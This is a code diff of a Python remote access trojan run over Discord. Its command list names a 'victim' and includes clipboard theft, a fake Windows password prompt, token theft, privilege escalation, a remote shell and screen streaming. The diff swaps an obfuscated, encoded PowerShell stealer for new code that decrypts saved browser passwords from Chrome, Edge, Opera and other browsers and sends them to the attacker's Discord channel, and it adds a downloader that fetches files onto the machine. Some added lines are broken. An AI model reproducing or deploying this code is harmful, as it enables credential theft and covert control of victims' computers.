@@ -1,6 +1,6 @@
-import os
-import discord
-import subprocess
+import os # controlling :3
+import discord # Diiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiscord
+import subprocess # sub or sus ? 
 import requests
 import json
 import pyautogui
@@ -17,10 +17,10 @@ import comtypes
 import win32com.client as wincl
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from pynput.keyboard import Key, Controller
-import re
-import datetime
+import re # parsing !!
+import datetime 
 from win32api import *
-import pyaudio
+import pyaudio # :)
 import psutil
 import winsound
 import win32gui
@@ -50,7 +50,6 @@ commands = "\n".join([
 	"randommousemovements - randomly moves the user's mouse location",
 	"randomvolume - changes the volume value randomly",
 	"clipboard - fetches the victim's clipboard and sends it",
-	"askescalate - asks the user to escalate privileges",
 	"escalate - tries to escalate privileges [DETECTED]",
 	"whoami - checks if femboyaccess is running as user or admin",
 	"msgbox <message> <title> - sends a message box",
@@ -63,6 +62,7 @@ commands = "\n".join([
 	"windowsphish - sends a fake windows security update pop-up asking for a password",
 	"displayoff - turns off screen",
 	"displayon - turns on screen",
+	"tokens - fetches discord tokens",
 	"critproc - makes femboyaccess into a critical process",
 	"uncritproc - makes femboyaccess into a normal process",
 	"idletime - shows how much time the user has been idle",
@@ -87,7 +87,7 @@ commands = "\n".join([
 	"closecd - closes the cd tray",
 	"spamtext <text> - shows text all over the screen using GDI",
 	"sus - downlaods the entire among us game, unzips it and starts it",
-	"shutdown - performs a computer shutdown"
+	"shutdown - performs a computer shutdown",
 	"restart - performs a computer restart",
 	"exit - exit this session"
 ])
@@ -107,6 +107,9 @@ MB_ICONERROR = 0x00000010
 MB_ICONINFORMATION = 0x00000040
 MB_ICONWARNING = 0x00000030
 MB_ICONQUESTION = 0x00000020
+
+# constants win32 rasters
+SRCCOPY = 0x00EE0086
 
 user32 = ctypes.windll.user32
 
@@ -136,18 +139,19 @@ async def start_random_volume_control():
 
 async def start_screen_streaming(message):
 	global stream_screen
+	screenshot = pyautogui.screenshot()
+	path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+	screenshot.save(path)
+	streaming_screen_file = discord.File(path)
+	screenreply = await message.reply(file=streaming_screen_file)
+
 	while stream_screen:
 		screenshot = pyautogui.screenshot()
 		path = os.path.join(os.getenv("TEMP"), "screenshot.png")
 		screenshot.save(path)
 		streaming_screen_file = discord.File(path)
-		if 'screenreply' not in locals():
-			screenreply = await message.reply(file=streaming_screen_file)
-		else:
-			await screenreply.remove_attachments(screenreply.attachments)
-			await asyncio.sleep(0.5)
-			await screenreply.add_files(streaming_screen_file)
 		await asyncio.sleep(0.5)
+		await screenreply.edit(attachments=[streaming_screen_file])
 
 async def check_privileges():
 	try:
@@ -337,6 +341,50 @@ async def download_sus(message):
 	ctypes.windll.shell32.ShellExecuteW(None, "open", game_executable, None, game_directory, 1)
 	await message.reply(await femboyaccess("sus", "among us started successfully! :3"))
 
+async def download(message, url: str, dest: str = "c:\\", download_percent = True) -> None:
+
+	"""function that can be uses to download files from an url and destination parameters
+		::param url: Url of the file (it must be direct link)
+		::param dest: it indicates where the file must be saved, it must include the filename with extension
+	"""
+	r = requests.get(url, allow_redirects=True, stream=True)
+	BLOCK_SIZE = 1024 # amount of data by interation
+	total_size = int(r.headers.get("content-length", 0)) # total iteration size
+	dl_list = []
+	if download_percent:
+		try:
+			with open(dest,"wb") as file:
+				i=0
+				for b in r.iter_content(BLOCK_SIZE): # get all bytes of the response
+					file.write(b) # write the byte
+					# progress bar : 0%|==========>|100%  => [progress%]
+					i+=len(b)
+					progress = (i/total_size)*100
+					visual_progress = "0%|"+ "="*int(progress/10)+">" + "|100%" + " => " + f"[{progress:.2f}%]"
+					if int(progress) %10 == 0 and int(progress) != 0  and int(progress) not in dl_list :
+						dl_list.append(int(progress))
+						await message.reply(await femboyaccess("download", visual_progress))
+			
+				completed = "0%|"+ "="*10+">" + "|100%" + " => " + f"[100.00%]"
+				#print(completed) # because the download can be stuck even if it's completed
+				await message.reply(completed)
+
+		except requests.exceptions.HTTPError as err: # search for HTTP errors
+			await message.reply(f"HTTP error occurred: {err}")
+		except Exception as err:
+			await message.reply(f"error happened during download: {err}") # search for all others error
+	else:
+		try:
+			open(dest,"wb").write(r.content) # MUCH FASTER WAY
+			message.reply('Download Ended !!')
+		except requests.exceptions.HTTPError as err:  # search for HTTP errors
+			await message.reply(f"HTTP error occurred: {err}")
+		except Exception as err:
+			await message.reply(f"An error occurred during the download: {err}")  # search for all others error
+
+async def start_process(processname,shell=False,check=False):
+
+	subprocess.run()
 @client.event
 async def on_ready():
 	guild = client.get_guild(int(guild_id))
@@ -373,7 +421,22 @@ async def on_message(message):
 		return
 
 	if message.content == "help":
-		await message.reply(await femboyaccess("help", commands))
+		txt = await femboyaccess("help", commands)
+		print(txt)
+		msgs = []
+		vierge = ''
+		for c in txt:
+			if len(vierge) >= 2000 or len(txt)-len(vierge) < 2000:
+				msgs.append('```'+vierge+'```')
+				vierge = ''
+
+
+			vierge +=c
+
+		for msg in msgs:
+			await message.reply(msg)
+
+					
 
 	if message.content == "ping":
 		await message.reply(await femboyaccess("ping", f"{round(client.latency * 1000)}ms"))
@@ -393,12 +456,23 @@ async def on_message(message):
 		await message.reply(await femboyaccess("ls", files))
 
 	if message.content.startswith("download"):
-		file_path = message.content.split(" ")[1]
+		url = message.content.split(" ")[1]
+		path = message.content.split(" ")[2]
 		try:
-			with open(file_path, "rb") as file:
-				await message.reply(await femboyaccess("download", "downloaded file! :3"), file=discord.File(file))
+			download_percent = message.content.split("")[3]
+			if download_percent == "true":
+				await download(message,url,path, True)
+
+			elif download_percent == "false":
+				await download(message,url,path, False)
+			else:
+				await download(message,url,path, False)
+
 		except Exception as e:
-			await message.reply(await femboyaccess("download", "failed to download file! :c"))
+			await download(message,url,path)
+
+
+
 
 	if message.content.startswith("shell"):
 		command = message.content.split(" ")[1]
@@ -674,19 +748,67 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		await message.reply(await femboyaccess("idletime", f"user has been idle for {duration} seconds! :3"))
 
 	if message.content.startswith("passwords"):
-		temp = os.getenv('temp')
-		def shell(command):
-			output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			global status
-			status = "ok"
-			return output.stdout.decode('CP437').strip()
-		passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
-		f4 = open(temp + r"\passwords.txt", 'w')
-		f4.write(str(passwords))
-		f4.close()
-		file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
-		await message.reply(await femboyaccess("passwords", "fetched passwords! :3"), file=file)
-		os.remove(temp + r"\passwords.txt")
+		await message.reply(await femboyaccess("passwords", "stealing passwords from browsers.. :3"))
+		passwords = ""
+		try:
+			# chrome
+			if os.path.exists(os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"):
+				shutil.copy2(os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data", "LoginData.db")
+				conn = sqlite3.connect("LoginData.db")
+				cursor = conn.cursor()
+				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+				for result in cursor.fetchall():
+					password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
+					passwords += f"website: {result[0]}\nusername: {result[1]}\npassword: {password}\n\n"
+				conn.close()
+				os.remove("LoginData.db")
+			# firefox
+			elif os.path.exists(os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\"):
+				profiles = os.listdir(os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\")
+				for profile in profiles:
+					if os.path.exists(os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\" + profile + "\\logins.json"):
+						with open(os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles\\" + profile + "\\logins.json", "r") as f:
+							data = json.load(f)
+							for login in data["logins"]:
+								passwords += f"website: {login['hostname']}\nusername: {login['username']}\npassword: {login['password']}\n\n"
+			# edge
+			elif os.path.exists(os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"):
+				shutil.copy2(os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data", "LoginData.db")
+				conn = sqlite3.connect("LoginData.db")
+				cursor = conn.cursor()
+				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+				for result in cursor.fetchall():
+					password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
+					passwords += f"website: {result[0]}\nusername: {result[1]}\npassword: {password}\n\n"
+				conn.close()
+				os.remove("LoginData.db")
+			# safari
+			elif os.path.exists(os.getenv("APPDATA") + "\\Apple Computer\\Safari\\"):
+				shutil.copy2(os.getenv("APPDATA") + "\\Apple Computer\\Safari\\Bookmarks.plist", "Bookmarks.plist")
+				with open("Bookmarks.plist", "rb") as f:
+					plist = plistlib.load(f)
+					for bookmark in plist["Children"][0]["Children"]:
+						if bookmark.get("Title") == "Passwords":
+							for login in bookmark["Children"]:
+								passwords += f"website: {login['URLString']}\nusername: {login['UserName']}\npassword: {login['Password']}\n\n"
+				os.remove("Bookmarks.plist")
+			# opera
+			elif os.path.exists(os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data"):
+				shutil.copy2(os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data", "LoginData.db")
+				conn = sqlite3.connect("LoginData.db")
+				cursor = conn.cursor()
+				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+				for result in cursor.fetchall():
+					password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
+					passwords += f"website: {result[0]}\nusername: {result[1]}\npassword: {password}\n\n"
+				conn.close()
+				os.remove("LoginData.db")
+			# other
+			else:
+				passwords = "no supported browsers found! :c"
+		except Exception as e:
+			passwords = f"an error occurred while stealing passwords: {e} :c"
+		await message.reply(await femboyaccess("passwords", passwords))
 
 	if message.content.startswith("streamscreen"):
 		if not stream_screen:
@@ -854,9 +976,9 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			await message.reply(await femboyaccess("gdi", f"started the patcopy effect for {time}ms! :3"))
 			for i in range(0, 100):
 				brush = win32gui.CreateSolidBrush(RGB(
-					randrange(255),
-					randrange(255),
-					randrange(255)
+					random.randrange(255),
+					random.randrange(255),
+					random.randrange(255)
 					))
 				win32gui.SelectObject(desk, brush)
 				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATCOPY)
@@ -864,6 +986,20 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			win32gui.ReleaseDC(desk, GetDesktopWindow())
 			win32gui.DeleteDC(desk)
 			await message.reply(await femboyaccess("gdi", f"stopped the patcopy effect! :3"))
+		elif mode == "srccopy":
+			await message.reply(await femboyaccess("gdi", f"started the srccopy effect for {time}ms! :3"))
+			for i in range(0, 100):
+				brush = win32gui.CreateSolidBrush(RGB(
+					random.randrange(255),
+					random.randrange(255),
+					random.randrange(255)
+				))
+				win32gui.SelectObject(desk, brush)
+				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), SRCCOPY)
+				asyncio.sleep(int(time))
+			win32gui.ReleaseDC(desk, GetDesktopWindow())
+			win32gui.DeleteDC(desk)
+			await message.reply(await femboyaccess("gdi", f"stopped the srccopy effect! :3"))
 
 	if message.content.startswith("opencd"):
 		ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
